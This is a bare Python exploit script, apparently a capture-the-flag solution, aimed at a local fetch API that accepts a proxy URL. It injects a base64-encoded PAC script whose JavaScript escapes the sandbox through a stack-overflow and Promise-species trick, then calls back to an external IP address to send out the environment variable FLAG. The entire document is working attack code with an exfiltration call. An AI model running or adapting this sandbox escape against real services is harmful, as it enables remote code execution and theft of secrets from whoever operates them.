
from itsdangerous import base64_encode
import httpx

TARGET = "http://localhost:8080/api/fetch"
WEBHOOK = "http://108.137.37.157:4444"

payload = "pac+data:plain/text;base64,"
payload += base64_encode("""
eval(`
FindProxyForURL=()=>{}
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('fetch("{WEBHOOK}?"+process.env.FLAG)')(); }
            )
        }
    }
};
p.then();`)
""".replace("{WEBHOOK}", WEBHOOK)).decode()

res = httpx.get(TARGET, params={
    "url": "https://google.com",
    "proxyUrl": payload
})
print(res.text)
